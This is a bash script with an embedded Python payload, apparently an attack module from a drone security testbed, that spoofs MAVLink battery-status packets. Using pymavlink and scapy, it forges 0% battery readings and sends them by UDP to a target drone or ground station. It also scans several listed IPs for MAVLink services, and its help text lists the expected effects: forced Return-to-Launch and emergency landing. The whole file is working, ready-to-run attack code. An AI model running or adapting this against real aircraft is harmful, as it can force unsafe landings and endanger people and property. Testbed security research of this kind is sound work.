#!/bin/bash
# battery_spoofing.sh - 드론 배터리 스푸핑 공격 모듈
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/battery_spoofing.sh
# Purpose: 드론 배터리 상태 스푸핑을 통한 비상 착륙 유도

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Battery Spoofing Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}       Battery Spoofing Attack             ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_battery_spoofing() {
    local target_ip=${1:-"127.0.0.1"}
    local target_port=${2:-"14550"}
    local duration=${3:-30}
    
    log_info "Starting battery spoofing attack"
    log_info "Target: ${target_ip}:${target_port}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_attack "$target_ip" "$target_port" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Battery spoofing attack completed successfully"
        return 0
    else
        log_error "Battery spoofing attack failed"
        return 1
    fi
}

create_and_run_attack() {
    local target_ip="$1"
    local target_port="$2"
    local duration="$3"
    
    log_info "Creating and executing battery spoofing attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
from scapy.all import *
import time

target_ip = "$target_ip"
target_port = int("$target_port")
duration = int("$duration")

def create_battery_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    
    return mav.battery_status_encode(
        id=0,
        battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
        type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
        temperature=300,
        voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],
        current_battery=-1,
        current_consumed=5000,
        energy_consumed=10000,
        battery_remaining=0
    ).pack(mav)

def send_packet(packet_data):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet, verbose=False)

print(f"Starting battery spoofing to {target_ip}:{target_port} for {duration}s")
print("Sending critical battery status (0% remaining)")

start_time = time.time()
packets_sent = 0

while time.time() - start_time < duration:
    send_packet(create_battery_status())
    packets_sent += 1
    
    if packets_sent % 10 == 0:
        print(f"Sent {packets_sent} spoofed battery packets")
    
    time.sleep(1)

print(f"Attack completed. Total packets sent: {packets_sent}")
PYEOF
    
    return $?
}

# 타겟 스캔
scan_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local targets=(
        "127.0.0.1:14550"
        "10.13.0.6:14550"
        "192.168.13.14:14550"
        "10.13.0.4:14550"
    )
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
            return 0
        fi
    done
    
    echo -e "${YELLOW}No live targets found, using default${NC}"
    return 1
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink scapy >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_ip="${1:-127.0.0.1}"
    local target_port="${2:-14550}"
    local duration="${3:-30}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_ip] [target_port] [duration]"
        echo "  target_ip   : Target IP address (default: 127.0.0.1)"
        echo "  target_port : Target port (default: 14550)"
        echo "  duration    : Attack duration in seconds (default: 30)"
        echo ""
        echo "Examples:"
        echo "  $0                           # Attack localhost with defaults"
        echo "  $0 10.13.0.6                # Attack specific IP"
        echo "  $0 10.13.0.6 14550 60       # Full parameters"
        echo ""
        echo "Expected Effects:"
        echo "  • GCS shows 0% battery remaining"
        echo "  • Triggers low battery warnings"
        echo "  • May activate Return-to-Launch (RTL) mode"
        echo "  • Emergency landing protocols may engage"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_targets
    
    # 공격 실행
    execute_battery_spoofing "$target_ip" "$target_port" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi